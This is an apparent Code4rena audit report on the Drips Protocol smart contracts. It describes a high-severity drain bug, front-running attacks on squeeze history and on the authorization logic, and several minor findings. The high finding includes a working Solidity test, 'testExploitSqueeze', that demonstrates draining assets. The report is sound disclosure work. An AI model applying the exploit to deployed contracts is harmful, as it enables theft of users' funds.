[](#about-c4)About C4
---------------------

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Drips Protocol smart contract system written in Solidity. The audit contest took place between January 25—February 3 2023.

This contest was judged by [Alex the Entreprenerd](https://twitter.com/GalloDaSballo).

Final report assembled by [itsmetechjay](https://twitter.com/itsmetechjay).

[](#summary)Summary
===================

The C4 analysis yielded an aggregated total of 3 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 11 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

[](#scope)Scope
===============

The code under review can be found within the [C4 Drips Protocol contest repository](https://github.com/code-423n4/2023-01-drips), and is composed of 8 smart contracts written in the Solidity programming language and includes 1,503 lines of Solidity code.

[](#severity-criteria)Severity Criteria
=======================================

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

*   Malicious Input Handling
*   Escalation of privileges
*   Arithmetic
*   Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_Submitted by [evan](https://github.com/code-423n4/2023-01-drips-findings/issues/315), also found by [HollaDieWaldfee](https://github.com/code-423n4/2023-01-drips-findings/issues/66)_

By creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender doesn’t have to put in any assets but the receiver can still squeeze this drip.

By setting a receiver that the sender controls, the sender can drain an arbitrary asset from the contract.

### [](#proof-of-concept)Proof of Concept

Let the cycle length be 10 seconds. By i-th second I mean the i-th second of the cycle.

At the 5th second, sender creates a drip that starts at 0th second and lasts for 2 seconds.

At the 6th second, sender removes this drip.

[https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569)

Since the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance.

[https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430)

[https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496)

Now the receiver squeezes from this drip.

`SqueezeStartCap = \_currCycleStart() = 0th second, squeezeEndCap = 6th second`, so the receiver can still squeeze out the full amount even though the sender has withdrawn all of his balance.

Please add the following test to DripsHub.t.sol. It verifies that the sender has retrieved all of his assets but the receiver can still squeeze.

        function customSetDrips(
            uint256 forUser,
            uint128 balanceFrom,
            uint128 balanceTo,
            DripsReceiver[] memory newReceivers
        ) internal {
            int128 balanceDelta = int128(balanceTo) - int128(balanceFrom);
            DripsReceiver[] memory currReceivers = loadDrips(forUser);
    
            vm.prank(driver);
            int128 realBalanceDelta =
                dripsHub.setDrips(forUser, erc20, currReceivers, balanceDelta, newReceivers, 0, 0);
            
            storeDrips(forUser, newReceivers);
    
        }
    
        function testExploitSqueeze() public {
            skipToCycleEnd();
            // Start dripping
            DripsReceiver[] memory receivers = new DripsReceiver[](1);
            receivers[0] = DripsReceiver(
                receiver,
                DripsConfigImpl.create(0, uint160(1 * dripsHub.AMT_PER_SEC_MULTIPLIER()), uint32(block.timestamp), 2)
            );
    
            DripsHistory[] memory history = new DripsHistory[](2);
    
            uint256 balanceBefore = balance();
            skip(5);
            customSetDrips(user, 0, 2, receivers);
            (,, uint32 lastUpdate,, uint32 maxEnd) = dripsHub.dripsState(user, erc20);
            history[0] = DripsHistory(0, receivers, lastUpdate, maxEnd);
    
            skip(1);
            receivers = dripsReceivers();
            customSetDrips(user, 2, 0, receivers);
            (,, lastUpdate,, maxEnd) = dripsHub.dripsState(user, erc20);
            history[1] = DripsHistory(0, receivers, lastUpdate, maxEnd);
    
            assertBalance(balanceBefore);
            
            // Squeeze
            vm.prank(driver);
            uint128 amt = dripsHub.squeezeDrips(receiver, erc20, user, 0, history);
            assertEq(amt, 2, "Invalid squeezed amt");
        }

One potential solution is to add an additional check after this line. Something along the lines of:

`if (squeezeStartCap < drips.updateTime) squeezeStartCap = drips.updateTime;`

Squeezing drips from a sender requires providing the sequence of drips configurations (see NatSpec description in [L337-L338](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L337-L338)):

> /// It can start at an arbitrary past configuration, but must describe all the configurations /// which have been used since then including the current one, in the chronological order.

The provided history entries are hashed and verified against the sender’s `dripsHistoryHash`.

However, the sender can prevent a receiver from squeezing drips by front-running the squeeze transaction and adding a new configuration. Adding a new configuration updates the current `dripsHistoryHash` and invalidates the `historyHash` provided by the receiver when squeezing. The receiver will then fail the drips history verification in [L461](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461) and the squeeze will fail.

Consider allowing a receiver to squeeze drips from a sender up until the current timestamp.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_Submitted by [0xA5DF](https://github.com/code-423n4/2023-01-drips-findings/issues/163), also found by [0xbepresent](https://github.com/code-423n4/2023-01-drips-findings/issues/124) and [ladboy233](https://github.com/code-423n4/2023-01-drips-findings/issues/34)_

The `Caller` contract enables users to authorize other users to execute tx on their behalf. This option enables the authorized/delegated user to add more users to the authorized users list. In case the original user is trying to remove an authorized user (i.e. run `unauthorize()`), the delegated user can simply front run that tx to add another user, then after `unauthorized()` is executed the delegated can use the added user to gain his authority back.

This would allow the malicious delegated user to keep executing txs on behalf of the original user and cause them a loss of funds (e.g. collecting funds on their behalf and sending it to the attacker’s address).

### [](#proof-of-concept-2)Proof of Concept

The test below demonstrates such a scenario:

*   Alice authorizes Bob
*   Bob becomes malicious and Alice now wants to remove him
*   Bob noticed the tx to unauthorize him and front runs it by authorizing Eve
*   Alice `unauthorize()` tx is executed
*   Bob now authorizes himself back again via Eve’s account

Front running can be done either by sending a tx with a higher gas price (usually tx are ordered in a block by the gas price / total fee), or by paying an additional fee to the validator if they manage to run their tx without reverting (i.e. by sending additional ETH to `block.coinbase`, hoping validator will notice it). It’s true that Alice can run `unauthorize()` again and again and needs to succeed only once, but:

*   Bob can keep adding other users and Alice would have to keep removing them all
*   This is an ongoing battle that can last forever, and Alice might not have enough knowledge, resources and time to deal with it right away. This might take hours or days, and in the meanwhile Alice might be receiving a significant amount of drips that would be stolen by Bob.

### [](#recommended-mitigation-steps-2)Recommended Mitigation Steps

Don’t allow authorized users to call `authorize()` on behalf of the original user.

This can be done by replacing `_msgSender()` with `msg.sender` at `authorize()`, if the devs want to enable authorizing by signing I think the best way would be to add a dedicated function for that (other ways to prevent calling `authorize()` from `callAs()` can increase gas cost for normal calls, esp. since we’ll need to cover all edge cases of recursive calls with `callBatched()`).

> Known behavior. I think it is debatable. The `authorize` means an other address is completely trusted in terms of access to funds. In most cases this will be the same actor like Alice. Just another address of Alice.

**[CodeSandwich (Drips) disagreed with severity and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1426357093):**

> Like Manuel said, this is known, authorizing somebody gives them extreme privileges anyway, like stealing all the funds available for the user in the protocol.
> 
> I disagree that it’s a High severity issue, because the attacked user with some effort can defend themselves. In a single batch they need to authorize a contract that would iterate over all addresses returned by `allAuthorized` and for each of them to call `unauthorize` on behalf of the attacked user.
> 
> I think that the above emergency defense mechanism could be built right into `Caller`’s API to make it cheaper and easier to run, basically adding an `unauthorizeAll` function that will clear the authorized addresses list. That’s why I agree that it **is** an issue to solve, but a low severity one, it’s only a quality of life improvement.
> 
> The proposed mitigation of banning authorized users from authorizing others is too heavy handed, because it hurts use cases like a slow DAO authorizing a trusted operator, who then needs to rotate keys or authorize a “script contract” performing automated operations on Drips protocol. Authorization by signing hurts all non-EOA addresses like DAOs or multisigs which don’t have private keys.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

A user can grant authorization to another address to make calls on their behalf via the `Caller.callAs` function. The `Caller.unauthorize` function allows the user to revoke the authorization of another address.

An authorized user can revoke the authorization of another authorized user of the same sender. This is because the authorized user can call the `Caller.unauthorize` function on behalf of the sender.

If `_cycleSecs` is set too low, for example, to a value less than the Ethereum block time of 12 sec, it will not be possible to squeeze. If set too high, e.g., larger than the current `block.timestamp`, it will not be possible to receive drips - only squeezing will be possible.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

The `Drips._isOrdered` function compares two given receivers. The receiver config can include the prefixed `dripId` in the 32 most significant bits. This allows using the `dripId` for changing the order of receivers when setting a new drips configuration without violating the sorting requirement, _First compares their `amtPerSec`s, then their `start`s and then their `duration`s_ ([see Drips.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L93)).

The `_currTimestamp()` function casts the `block.timestamp` to a uint32. However it’s not always necessary to have a uint32.

In the example below you are assigning the timestamp to a uint256. Which makes it unnecessary to cast the timestamp to uint32. So it’s better to call `block.timestamp` directly.
